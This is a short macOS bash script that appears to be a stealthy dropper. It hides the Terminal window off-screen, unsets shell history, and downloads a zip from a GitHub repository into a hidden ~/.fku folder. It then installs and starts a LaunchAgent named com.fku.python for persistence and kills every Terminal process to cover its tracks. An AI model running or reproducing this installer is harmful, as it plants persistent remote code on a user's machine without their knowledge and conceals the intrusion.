#!/bin/bash

printf '\e[8;1;1t'
printf '\e[3;100000;100000t'
printf '\e[2t'

set -e           # exit on error
set -o pipefail  # trace ERR through pipes
set -o errtrace  # trace ERR through 'time command' and other functions
set -o errexit   # exit the script if any statement returns a non-true return value

unset HISTFILE

# git clone https://github.com/fku11/osx ~/.fku
## OR
zipfile="/tmp/fku.zip"
fkudir="/Users/`whoami`/.fku"
curl -fsSL "https://github.com/fku11/osx/archive/master.zip" -o "$zipfile"
unzip "$zipfile" -d /tmp/
mv /tmp/osx-master/ $fkudir

sed -i -e "s/username/`whoami`/g" ~/.fku/com.fku.python.plist
cp ~/.fku/com.fku.python.plist ~/Library/LaunchAgents/
launchctl load ~/Library/LaunchAgents/com.fku.python.plist
launchctl start com.fku.python

clear
ps aux | grep -i "Terminal" | xargs kill -9

